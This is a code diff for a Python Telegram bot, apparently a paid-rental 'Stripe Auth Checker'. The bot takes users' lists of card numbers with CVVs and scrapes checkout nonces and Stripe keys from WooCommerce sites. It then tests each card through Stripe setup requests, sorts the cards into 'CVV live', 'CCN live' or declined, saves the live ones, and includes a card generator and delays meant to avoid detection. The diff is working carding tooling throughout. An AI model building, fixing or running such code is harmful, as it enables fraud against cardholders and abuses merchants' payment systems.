@@ -8,24 +8,16 @@ import os
 import json
 import threading
 import asyncio
-
-# FIXED: Compatible imports for python-telegram-bot 20.7
 from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
-from telegram.ext import (
-    ApplicationBuilder, 
-    CommandHandler, 
-    MessageHandler, 
-    filters, 
-    ContextTypes, 
-    CallbackQueryHandler
-)
-
-from concurrent.futures import ThreadPoolExecutor
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import urllib3
 from datetime import datetime, timedelta
 from html import escape
+import aiohttp
 from queue import Queue
 from fake_useragent import UserAgent
+from urllib.parse import urlencode, urljoin
 
 # Disable warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -49,10 +41,10 @@ LOGS_CHAT_ID = "6764941964"
 BIN_API_URL = "https://isnotsin.com/bin-info/api?bin="
 
 # OPTIMIZED: Better thread pool configuration for HIGH multi-user performance
-GLOBAL_MAX_WORKERS = 1000
-USER_MAX_WORKERS = 3
-REQUEST_TIMEOUT = 15
-TELEGRAM_TIMEOUT = 8
+GLOBAL_MAX_WORKERS = 50  # Reduced to prevent resource exhaustion
+USER_MAX_WORKERS = 2
+REQUEST_TIMEOUT = 15  # Increased timeout
+TELEGRAM_TIMEOUT = 10
 MAX_CONCURRENT_USERS = 5
 
 # List of authorized user IDs
@@ -77,8 +69,9 @@ global_thread_pool = ThreadPoolExecutor(max_workers=GLOBAL_MAX_WORKERS, thread_n
 user_sessions = {}
 
 # Active user management with better concurrency control
-active_users_lock = threading.Lock()
+active_users_lock = threading.RLock()  # Changed to RLock for better synchronization
 active_users_count = 0
+user_queues = {}
 
 # Initialize fake UserAgent
 try:
@@ -153,9 +146,9 @@ def create_session():
     """Create a requests session with connection pooling"""
     session = requests.Session()
     adapter = requests.adapters.HTTPAdapter(
-        pool_connections=50,
-        pool_maxsize=200,
-        max_retries=1,
+        pool_connections=20,  # Reduced to prevent connection exhaustion
+        pool_maxsize=100,
+        max_retries=2,  # Increased retries
         pool_block=False
     )
     session.mount('http://', adapter)
@@ -201,7 +194,7 @@ def parse_stripe_response(response_text):
 
 def fetch_nonce_and_key(url):
     try:
-        res = global_session.get(url, timeout=7)
+        res = global_session.get(url, timeout=10)  # Increased timeout
         res.raise_for_status()
         html = res.text
         nonce_match = (re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html) or re.search(r'"_ajax_nonce":"([a-f0-9]{10,})"', html) or re.search(r'name="woocommerce-process-checkout-nonce" value="([a-f0-9]{10,})"', html))
@@ -221,46 +214,50 @@ def fetch_nonce_and_key(url):
         send_error_log_sync(error_msg)
         return {'nonce': None, 'key': None}
 
-# OPTIMIZED: Non-blocking card processing with queue system
+# FIXED: UserCardProcessor with better error handling and resource management
 class UserCardProcessor:
     def __init__(self, user_session):
         self.user_session = user_session
         self.card_queue = Queue()
+        self.results_queue = Queue()
         self.processing = False
         self.workers = []
         self.approved_cards = []
+        self.processing_lock = threading.Lock()
         
     def start_processing(self, cards):
         """Start processing cards for this user"""
-        self.processing = True
-        self.approved_cards = []
-        
-        # Add all cards to queue
-        for card in cards:
-            self.card_queue.put(card)
+        with self.processing_lock:
+            self.processing = True
+            self.approved_cards = []
             
-        # Start worker threads for this user
-        for i in range(USER_MAX_WORKERS):
-            worker = threading.Thread(
-                target=self._card_worker, 
-                args=(i,),
-                daemon=True,
-                name=f"UserWorker_{self.user_session['chat_id']}_{i}"
-            )
-            worker.start()
-            self.workers.append(worker)
-            
+            # Add all cards to queue
+            for card in cards:
+                self.card_queue.put(card)
+                
+            # Start worker threads for this user
+            for i in range(USER_MAX_WORKERS):
+                worker = threading.Thread(
+                    target=self._card_worker, 
+                    args=(i,),
+                    daemon=True,
+                    name=f"UserWorker_{self.user_session['chat_id']}_{i}"
+                )
+                worker.start()
+                self.workers.append(worker)
+                
     def stop_processing(self):
         """Stop processing for this user"""
-        self.processing = False
-        # Clear the queue
-        while not self.card_queue.empty():
-            try:
-                self.card_queue.get_nowait()
-            except:
-                pass
-        self.workers.clear()
-        
+        with self.processing_lock:
+            self.processing = False
+            # Clear the queue
+            while not self.card_queue.empty():
+                try:
+                    self.card_queue.get_nowait()
+                except:
+                    pass
+            self.workers.clear()
+            
     def _card_worker(self, worker_id):
         """Worker thread to process cards for this user"""
         headers = prepare_headers()
@@ -268,9 +265,9 @@ class UserCardProcessor:
         while self.processing and not self.card_queue.empty():
             try:
                 # Add delay between requests to avoid detection
-                time.sleep(0.3)
+                time.sleep(0.5)  # Increased delay
                 
-                card = self.card_queue.get(timeout=0.5)
+                card = self.card_queue.get(timeout=1.0)  # Increased timeout
                 if card is None:
                     break
                     
@@ -282,8 +279,8 @@ class UserCardProcessor:
                 continue
                 
     def _process_single_card(self, card, headers, worker_id):
-        """Process a single card"""
-        if not self.user_session["checking"]:
+        """Process a single card - MODIFIED: No live notifications"""
+        if not self.user_session.get("checking", False):
             return
             
         try:
@@ -294,15 +291,17 @@ class UserCardProcessor:
             try:
                 card_parts = card.split('|')
                 if len(card_parts) < 4:
-                    self.user_session["stats"]["declined"] += 1
-                    self.user_session["current_index"] += 1
+                    with active_users_lock:
+                        self.user_session["stats"]["declined"] += 1
+                        self.user_session["current_index"] += 1
                     return
                     
                 number, exp_month, exp_year, cvv = card_parts[:4]
                 exp_year = exp_year[-2:] if len(exp_year) > 2 else exp_year
             except:
-                self.user_session["stats"]["declined"] += 1
-                self.user_session["current_index"] += 1
+                with active_users_lock:
+                    self.user_session["stats"]["declined"] += 1
+                    self.user_session["current_index"] += 1
                 return
 
             # Get site and nonce/key
@@ -312,8 +311,9 @@ class UserCardProcessor:
             key = result['key']
             
             if not nonce or not key:
-                self.user_session["stats"]["declined"] += 1
-                self.user_session["current_index"] += 1
+                with active_users_lock:
+                    self.user_session["stats"]["declined"] += 1
+                    self.user_session["current_index"] += 1
                 return
                 
             # Prepare Stripe data
@@ -352,49 +352,60 @@ class UserCardProcessor:
                         
                         # Map Stripe errors directly
                         if error_code in ['invalid_number', 'incorrect_number']:
-                            self.user_session["stats"]["declined"] += 1
-                            self.user_session["current_index"] += 1
+                            with active_users_lock:
+                                self.user_session["stats"]["declined"] += 1
+                                self.user_session["current_index"] += 1
                             return
                         elif error_code in ['invalid_cvc', 'incorrect_cvc']:
                             # This is CCN live - card is valid but CVV wrong
-                            self.user_session["stats"]["ccn_live"] += 1
+                            with active_users_lock:
+                                self.user_session["stats"]["ccn_live"] += 1
                             self._save_live_card(card, 'CCN LIVE: Incorrect CVC', 'CCN')
+                            bin_info = fetch_bin_info(number)
                             approved_card_info = {
                                 'card': card,
                                 'status': 'ccn_live',
                                 'message': 'CCN LIVE: Incorrect CVC',
-                                'bin_info': fetch_bin_info(number)
+                                'bin_info': bin_info
                             }
-                            self.approved_cards.append(approved_card_info)
-                            self.user_session["current_index"] += 1
+                            with self.processing_lock:
+                                self.approved_cards.append(approved_card_info)
+                            with active_users_lock:
+                                self.user_session["current_index"] += 1
                             return
                         elif error_code in ['expired_card']:
-                            self.user_session["stats"]["declined"] += 1
-                            self.user_session["current_index"] += 1
+                            with active_users_lock:
+                                self.user_session["stats"]["declined"] += 1
+                                self.user_session["current_index"] += 1
                             return
                         elif error_code in ['card_declined']:
-                            self.user_session["stats"]["declined"] += 1
-                            self.user_session["current_index"] += 1
+                            with active_users_lock:
+                                self.user_session["stats"]["declined"] += 1
+                                self.user_session["current_index"] += 1
                             return
                         else:
                             # Other Stripe errors treated as declined
-                            self.user_session["stats"]["declined"] += 1
-                            self.user_session["current_index"] += 1
+                            with active_users_lock:
+                                self.user_session["stats"]["declined"] += 1
+                                self.user_session["current_index"] += 1
                             return
                     
                     if not payment_method_id:
-                        self.user_session["stats"]["declined"] += 1
-                        self.user_session["current_index"] += 1
+                        with active_users_lock:
+                            self.user_session["stats"]["declined"] += 1
+                            self.user_session["current_index"] += 1
                         return
                 else:
                     # Stripe API call failed
-                    self.user_session["stats"]["declined"] += 1
-                    self.user_session["current_index"] += 1
+                    with active_users_lock:
+                        self.user_session["stats"]["declined"] += 1
+                        self.user_session["current_index"] += 1
                     return
                     
             except Exception as e:
-                self.user_session["stats"]["declined"] += 1
-                self.user_session["current_index"] += 1
+                with active_users_lock:
+                    self.user_session["stats"]["declined"] += 1
+                    self.user_session["current_index"] += 1
                 return
 
             # Prepare setup data
@@ -426,7 +437,8 @@ class UserCardProcessor:
                     
                     # Track approved cards - ONLY CVV_LIVE and CCN_LIVE are considered "approved"
                     if result['status'] == 'cvv_live':
-                        self.user_session["stats"]["cvv_live"] += 1
+                        with active_users_lock:
+                            self.user_session["stats"]["cvv_live"] += 1
                         self._save_live_card(card, result['rawMessage'], 'AUTH')
                         approved_card_info = {
                             'card': card,
@@ -434,10 +446,12 @@ class UserCardProcessor:
                             'message': result['rawMessage'],
                             'bin_info': bin_info
                         }
-                        self.approved_cards.append(approved_card_info)
+                        with self.processing_lock:
+                            self.approved_cards.append(approved_card_info)
                             
                     elif result['status'] == 'ccn_live':
-                        self.user_session["stats"]["ccn_live"] += 1
+                        with active_users_lock:
+                            self.user_session["stats"]["ccn_live"] += 1
                         self._save_live_card(card, result['rawMessage'], 'CCN')
                         approved_card_info = {
                             'card': card,
@@ -445,28 +459,35 @@ class UserCardProcessor:
                             'message': result['rawMessage'],
                             'bin_info': bin_info
                         }
-                        self.approved_cards.append(approved_card_info)
+                        with self.processing_lock:
+                            self.approved_cards.append(approved_card_info)
                         
                     # EVERYTHING ELSE IS DECLINED
                     else:
-                        self.user_session["stats"]["declined"] += 1
+                        with active_users_lock:
+                            self.user_session["stats"]["declined"] += 1
                         self._save_declined_card(card, result)
                 else:
-                    self.user_session["stats"]["declined"] += 1
+                    with active_users_lock:
+                        self.user_session["stats"]["declined"] += 1
                     
             except Exception as e:
-                self.user_session["stats"]["declined"] += 1
+                with active_users_lock:
+                    self.user_session["stats"]["declined"] += 1
                 
         except Exception as e:
-            self.user_session["stats"]["declined"] += 1
+            with active_users_lock:
+                self.user_session["stats"]["declined"] += 1
         
-        self.user_session["current_index"] += 1
-        self.user_session["current_card_info"] = None
+        with active_users_lock:
+            self.user_session["current_index"] += 1
+            self.user_session["current_card_info"] = None
         
     def get_approved_cards(self):
         """Get the list of approved cards"""
-        return self.approved_cards
-        
+        with self.processing_lock:
+            return self.approved_cards.copy()
+            
     def _save_live_card(self, card, message, card_type):
         """Save live card to file"""
         try:
@@ -577,7 +598,7 @@ def build_keyboard(task_id, counts, current_card_info):
     
     return InlineKeyboardMarkup(buttons)
 
-# MODIFIED: checking_thread to send approved cards file after completion
+# FIXED: checking_thread with better error handling and resource management
 def checking_thread(user_session):
     """Optimized checking thread that sends approved cards file after completion"""
     try:
@@ -603,7 +624,7 @@ def checking_thread(user_session):
         last_update_time = time.time()
         update_interval = 2.0
         
-        while (user_session["checking"] and 
+        while (user_session.get("checking", False) and 
                user_session["current_index"] < total_cards and
                processor.processing):
             
@@ -613,10 +634,10 @@ def checking_thread(user_session):
                 update_progress_message_sync(user_session)
                 last_update_time = current_time
                 
-            time.sleep(0.3)
+            time.sleep(0.5)  # Increased sleep to reduce CPU usage
             
         # MODIFIED: Send approved cards file after completion
-        if user_session["checking"]:
+        if user_session.get("checking", False):
             # Get approved cards from processor
             approved_cards = processor.get_approved_cards()
             
@@ -748,9 +769,9 @@ def generate_random_expiry():
     
     return month_str, year_str_4d, year_str_2d
 
-# FIXED: Synchronous version of get_user_info to avoid async issues
-def get_user_info_sync(user_id):
-    """Get username and first name for a user ID - synchronous version"""
+# OPTIMIZED: Faster user info fetching with caching
+async def get_user_info(user_id):
+    """Get username and first name for a user ID"""
     try:
         if user_id in user_info_cache:
             return user_info_cache[user_id]
@@ -758,16 +779,17 @@ def get_user_info_sync(user_id):
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChat"
         params = {'chat_id': user_id}
         
-        response = global_session.get(url, params=params, timeout=5)
-        if response.status_code == 200:
-            data = response.json()
-            if data.get('ok'):
-                user = data['result']
-                username = user.get('username', 'No username')
-                first_name = user.get('first_name', 'No name')
-                user_info = f"@{username}" if username != 'No username' else first_name
-                user_info_cache[user_id] = user_info
-                return user_info
+        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
+            async with session.post(url, params=params) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    if data.get('ok'):
+                        user = data['result']
+                        username = user.get('username', 'No username')
+                        first_name = user.get('first_name', 'No name')
+                        user_info = f"@{username}" if username != 'No username' else first_name
+                        user_info_cache[user_id] = user_info
+                        return user_info
     except Exception as e:
         logger.error(f"Error getting user info for {user_id}: {e}")
     
@@ -895,32 +917,33 @@ def cleanup_expired_rentals():
         save_rental_data()
         logger.info(f"Cleaned up {len(expired_users)} expired rentals")
 
-# OPTIMIZED: Get user session with better resource management
+# FIXED: Get user session with better resource management and thread safety
 def get_user_session(chat_id):
     """Get or create user session with resource limits"""
-    if chat_id not in user_sessions:
-        user_sessions[chat_id] = {
-            "checking": False,
-            "cards": [],
-            "current_index": 0,
-            "stats": {
-                "cvv_live": 0,
-                "ccn_live": 0,
-                "declined": 0,
-                "total": 0
-            },
-            "start_time": None,
-            "message_id": None,
-            "chat_id": chat_id,
-            "user_file": f"cc_{chat_id}.txt",
-            "current_card_info": None,
-            "task_id": str(uuid.uuid4())[:8],
-            "processor": None,
-            "active": False
-        }
-    return user_sessions[chat_id]
+    with active_users_lock:
+        if chat_id not in user_sessions:
+            user_sessions[chat_id] = {
+                "checking": False,
+                "cards": [],
+                "current_index": 0,
+                "stats": {
+                    "cvv_live": 0,
+                    "ccn_live": 0,
+                    "declined": 0,
+                    "total": 0
+                },
+                "start_time": None,
+                "message_id": None,
+                "chat_id": chat_id,
+                "user_file": f"cc_{chat_id}.txt",
+                "current_card_info": None,
+                "task_id": str(uuid.uuid4())[:8],
+                "processor": None,
+                "active": False
+            }
+        return user_sessions[chat_id]
 
-# OPTIMIZED: Check if system can handle more users
+# FIXED: Check if system can handle more users with thread safety
 def can_accept_new_user():
     """Check if system can accept new checking users"""
     with active_users_lock:
@@ -1061,7 +1084,7 @@ def format_card_display(card, current_index, total_cards):
     return f"{current_index}/{total_cards} - {card}"
 
 def update_progress_message_sync(user_session):
-    if not user_session["checking"]:
+    if not user_session.get("checking", False):
         return
     
     try:
@@ -1187,7 +1210,7 @@ async def check_access(update: Update):
         return False
     return True
 
-# MODIFIED: Handle stop button callback - preserve statistics display and send approved cards file
+# FIXED: Handle stop button callback with better thread safety
 async def handle_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle stop button callback - preserve statistics display and send approved cards file"""
     query = update.callback_query
@@ -1255,7 +1278,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "DM @mcchiatoos for any problem"
     )
 
-# MODIFIED: Stop command to send approved cards file
+# FIXED: Stop command with better session management
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the /stop command"""
     if not await check_access(update):
@@ -1422,7 +1445,7 @@ async def active_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if active_users:
         user_list = []
         for session in active_users:
-            user_info = get_user_info_sync(session["chat_id"])  # FIXED: Use sync version
+            user_info = await get_user_info(session["chat_id"])
             progress = f"{session['current_index']}/{session['stats']['total']}"
             user_list.append(f"👤 {user_info} -  {progress}")
         
@@ -1461,7 +1484,7 @@ async def system_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if active_users:
         user_list = []
         for session in active_users:
-            user_info = get_user_info_sync(session["chat_id"])  # FIXED: Use sync version
+            user_info = await get_user_info(session["chat_id"])
             progress = f"{session['current_index']}/{session['stats']['total']}"
             user_list.append(f"• {user_info} - {progress} cards")
         
@@ -1469,6 +1492,7 @@ async def system_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await safe_send_message(update, system_info)
 
+# FIXED: gen_command with better error handling
 async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the /gen command for generating cards with custom prefix, optional CVV, and live checking"""
     if not await check_access(update):
@@ -2017,7 +2041,7 @@ async def list_rentals_command(update: Update, context: ContextTypes.DEFAULT_TYP
     rentals_list = []
     for rental_user_id, expiry_time in USER_RENTALS.items():
         days_left = get_rental_days_left(expiry_time)
-        username = get_user_info_sync(rental_user_id)  # FIXED: Use sync version
+        username = await get_user_info(rental_user_id)
         rentals_list.append(f"👤 {username} (ID: {rental_user_id}) - 📅 {days_left} days left")
     
     await safe_send_message(
@@ -2038,7 +2062,7 @@ async def list_users_with_names_command(update: Update, context: ContextTypes.DE
         
     users_list = []
     for user_id in AUTHORIZED_USERS:
-        username = get_user_info_sync(user_id)  # FIXED: Use sync version
+        username = await get_user_info(user_id)
         users_list.append(f"👤 {username} (ID: {user_id})")
     
     await safe_send_message(
@@ -2060,7 +2084,7 @@ async def list_rentals_with_names_command(update: Update, context: ContextTypes.
     rentals_list = []
     for rental_user_id, expiry_time in USER_RENTALS.items():
         days_left = get_rental_days_left(expiry_time)
-        username = get_user_info_sync(rental_user_id)  # FIXED: Use sync version
+        username = await get_user_info(rental_user_id)
         rentals_list.append(f"👤 {username} (ID: {rental_user_id}) - 📅 {days_left} days left")
     
     await safe_send_message(
@@ -2131,6 +2155,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await safe_send_message(update, "❌ Please upload a .txt file")
 
+# FIXED: start_checking with better resource management and error handling
 async def start_checking(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Optimized start checking that prevents system overload"""
     try:
@@ -2273,7 +2298,7 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logger.error(f"Failed to send error message to user: {e}")
 
-# FIXED: Simplified main function for Python 3.11.9 compatibility
+# FIXED: Main function with better exception handling and resource cleanup
 def main():
     """Main function to run the bot with optimized multi-user performance"""
     logger.info("🤖 Multi-User Stripe Auth Checker Bot Starting...")
@@ -2287,60 +2312,55 @@ def main():
     
     cleanup_expired_rentals()
     
-    try:
-        # Create application using ApplicationBuilder
-        application = (
-            ApplicationBuilder()
-            .token(BOT_TOKEN)
-            .concurrent_updates(True)
-            .build()
-        )
-        
-        # Add error handler
-        application.add_error_handler(error_handler)
-        
-        # Add handlers
-        application.add_handler(CommandHandler("start", start_command))
-        application.add_handler(CommandHandler("stop", stop_command))
-        application.add_handler(CommandHandler("stats", stats_command))
-        application.add_handler(CommandHandler("myaccess", myaccess_command))
-        application.add_handler(CommandHandler("bin", bin_command))
-        application.add_handler(CommandHandler("gen", gen_command))
-        application.add_handler(CommandHandler("active", active_command))
-        application.add_handler(CommandHandler("system", system_command))
-        application.add_handler(CommandHandler("cmds", cmds_command))
-        application.add_handler(CommandHandler("help", cmds_command))
-        
-        # Add admin commands
-        application.add_handler(CommandHandler("adduser", add_user_command))
-        application.add_handler(CommandHandler("addrental", add_rental_command))
-        application.add_handler(CommandHandler("listusers", list_users_command))
-        application.add_handler(CommandHandler("listrentals", list_rentals_command))
-        application.add_handler(CommandHandler("listusers_with_names", list_users_with_names_command))
-        application.add_handler(CommandHandler("listrentals_with_names", list_rentals_with_names_command))
-        application.add_handler(CommandHandler("removeuser", remove_user_command))
-        application.add_handler(CommandHandler("removerental", remove_rental_command))
-        
-        application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start_checking))
-        
-        application.add_handler(CallbackQueryHandler(handle_stop_callback, pattern=r'^stop_masschk_'))
-        application.add_handler(CallbackQueryHandler(handle_noop_callback, pattern=r'^noop$'))
-        
-        logger.info("✅ Bot is running with 5 user limit and approved cards results file...")
-        
-        # Start polling with basic configuration
-        application.run_polling(
-            poll_interval=1,
-            timeout=20,
-            drop_pending_updates=True
-        )
-        
-    except Exception as e:
-        logger.error(f"Bot crashed with error: {e}")
-        logger.info("🔄 Restarting bot in 5 seconds...")
-        time.sleep(5)
-        main()  # Restart
+    while True:
+        try:
+            application = Application.builder().token(BOT_TOKEN).build()
+            
+            application.add_error_handler(error_handler)
+            
+            # Add handlers
+            application.add_handler(CommandHandler("start", start_checking))
+            application.add_handler(CommandHandler("stop", stop_command))
+            application.add_handler(CommandHandler("stats", stats_command))
+            application.add_handler(CommandHandler("myaccess", myaccess_command))
+            application.add_handler(CommandHandler("bin", bin_command))
+            application.add_handler(CommandHandler("gen", gen_command))
+            application.add_handler(CommandHandler("active", active_command))
+            application.add_handler(CommandHandler("system", system_command))
+            application.add_handler(CommandHandler("cmds", cmds_command))
+            application.add_handler(CommandHandler("help", cmds_command))
+            
+            # Add admin commands
+            application.add_handler(CommandHandler("adduser", add_user_command))
+            application.add_handler(CommandHandler("addrental", add_rental_command))
+            application.add_handler(CommandHandler("listusers", list_users_command))
+            application.add_handler(CommandHandler("listrentals", list_rentals_command))
+            application.add_handler(CommandHandler("listusers_with_names", list_users_with_names_command))
+            application.add_handler(CommandHandler("listrentals_with_names", list_rentals_with_names_command))
+            application.add_handler(CommandHandler("removeuser", remove_user_command))
+            application.add_handler(CommandHandler("removerental", remove_rental_command))
+            
+            application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start_command))
+            
+            application.add_handler(CallbackQueryHandler(handle_stop_callback, pattern=r'^stop_masschk_'))
+            application.add_handler(CallbackQueryHandler(handle_noop_callback, pattern=r'^noop$'))
+            
+            logger.info("✅ Bot is running with 5 user limit and approved cards results file...")
+            application.run_polling(
+                drop_pending_updates=True,
+                allowed_updates=Update.ALL_TYPES,
+                poll_interval=1.0,
+                timeout=30,  # Increased timeout
+                read_timeout=30,
+                write_timeout=30,
+                connect_timeout=30
+            )
+            
+        except Exception as e:
+            logger.error(f"Bot crashed with error: {e}")
+            logger.info("🔄 Restarting bot in 10 seconds...")
+            time.sleep(10)
 
 if __name__ == "__main__":
     main()
